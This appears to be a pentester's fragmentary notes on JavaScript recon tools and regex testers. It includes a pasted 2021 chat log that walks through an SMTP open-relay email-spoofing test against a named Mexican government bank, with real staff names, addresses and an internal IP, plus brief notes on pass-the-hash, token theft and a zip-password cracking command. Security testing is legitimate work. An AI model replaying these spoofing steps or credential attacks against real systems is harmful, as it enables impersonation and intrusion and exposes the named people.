+\href{https://pkg.go.dev/github.com/BishopFox/jsluice}{\pandocbounded{\includesvg[keepaspectratio]{./media-412fbe72348559e5/dca7434755cb04db93ad1dacf6dbc900368e9b80.svg}}}
+
+\texttt{jsluice}~is a Go package
+and~\href{https://github.com/BishopFox/jsluice/blob/main/cmd/jsluice}{command-line
+tool}~for extracting URLs, paths, secrets, and other interesting data
+from JavaScript source code.
+
+If you want to do those things right away: look at
+the~\href{https://github.com/BishopFox/jsluice/blob/main/cmd/jsluice}{command-line
+tool}.
+
+If you want to integrate~\texttt{jsluice}’s capabilities with your own
+project: look at
+the~\href{https://github.com/BishopFox/jsluice/blob/main/examples}{examples},
+and read
+the~\href{https://pkg.go.dev/github.com/BishopFox/jsluice}{package
+documentation}.
+
+\section{JavaScript Extraction CLI \&
+Package}\label{javascript-extraction-cli-package}
+
+\href{https://github.com/003random/getJS\#javascript-extraction-cli--package}{}
+
+~\href{https://pkg.go.dev/github.com/003random/getJS}{\pandocbounded{\includesvg[keepaspectratio]{./media-412fbe72348559e5/dca7434755cb04db93ad1dacf6dbc900368e9b80.svg}}}~\href{https://github.com/003random/getJS/releases}{\pandocbounded{\includesvg[keepaspectratio]{./media-412fbe72348559e5/c660015b8c677f8ba47fce55dc19a0ff98355f4d.svg}}}\href{https://github.com/003random/getJS/blob/master/LICENSE}{\pandocbounded{\includesvg[keepaspectratio]{./media-412fbe72348559e5/1d3def623588cea73f40b0cb92b66dfea43792d8.svg}}}
+
+This is a powerful tool for extracting JavaScript sources from URLs and
+web pages / HTTP responses. It offers a command-line interface (CLI) for
+straightforward URL processing and a package interface for custom
+integrations, making it ideal for pentesters, bug bounty hunters, and
+developers needing to extract JS sources efficiently.
+
+LInk finder
+
+git clone https://github.com/GerbenJavado/LinkFinder.git cd LinkFinder
+python3 -m pip install -r requirements.txt
+
+\subsubsection{Regex Test}\label{regex-test}
+
+https://regex101.com/
+
+https://regexr.com/
+
+\begin{itemize}
+\tightlist
+\item[$\square$]
+  https://devina.io/redos-checker
+\end{itemize}
+
+\subsubsection{Test}\label{test-1}
+
+test open relay suplantacion de identidad por correo electronico
+
+!{[}{[}A.10 Recursos/images/image-1 1.png{]}{]}
+
+!{[}{[}A.10 Recursos/images/image-2 1.png{]}{]}
+
+Carlos Villa, {[}23/02/2021 06:51 p.~m.{]} smtpout3.banobras.gob.mx
+
+Carlos Villa, {[}23/02/2021 06:51 p.~m.{]} mail from:
+Omar.Mata@banobras.gob.mx
+
+Carlos Villa, {[}23/02/2021 06:53 p.~m.{]} smtpin3.banobras.gob.mx
+
+Carlos Villa, {[}23/02/2021 07:07 p.~m.{]} ese es el problema
+
+Carlos Villa, {[}23/02/2021 07:07 p.~m.{]} y eso es facil saltar
+
+Carlos Villa, {[}23/02/2021 07:08 p.~m.{]} solo necesitamos una ip en
+lista blanca
+
+Carlos Villa, {[}23/02/2021 07:08 p.~m.{]} o que no este sucia
+
+Carlos Villa, {[}23/02/2021 07:08 p.~m.{]} pero que weba
+
+Carlos Villa, {[}23/02/2021 07:10 p.~m.{]} oie
+
+Carlos Villa, {[}23/02/2021 07:10 p.~m.{]} puedes probar este
+
+Carlos Villa, {[}23/02/2021 07:10 p.~m.{]} telnet 172.27.221.4 ehlo
+172.27.221.4 mail from: contacto@banobras.gob.mx rcpt to:
+omar.mata@banobras.gob.mx data From: Carlos David Villagomez Quezada
+\href{mailto:carlos.villagomez@banobras.gob.mx}{\nolinkurl{carlos.villagomez@banobras.gob.mx}}
+To: Mata Rubio Omar Manuel
+\href{mailto:omar.mata@banobras.gob.mx}{\nolinkurl{omar.mata@banobras.gob.mx}}
+Subject: Test de Open Relay en SMTP Este es un mensaje para evidencia
+que ataques de suplantacion de identidad son viables .
+
+Carlos Villa, {[}23/02/2021 07:11 p.~m.{]} porfis
+
+Carlos Villa, {[}23/02/2021 07:11 p.~m.{]} uno por linea en consola
+
+Carlos Villa, {[}23/02/2021 07:11 p.~m.{]} en el telnet es al puerto 25
+
+!{[}{[}A.10 Recursos/images/image-3 1.png{]}{]}
+
+!{[}{[}image-4 1.png{]}{]}
+
+1 pas the bas lssas 2 robot tokens 3 inyecio proceso
+
+estos 2 haces que tu proceso y token se pase al del usuario victima y
+literal ejecutarias cosas con ese usuario
+
+\subsubsection{zip crack hash}\label{zip-crack-hash}
+
+fcrackzip –dictionary –verbose –charset Aa –length 12 –use-unzip -p
+list.txt PWK.zipp
+
+!{[}{[}image-5 1.png{]}{]}
+
+\end{document}
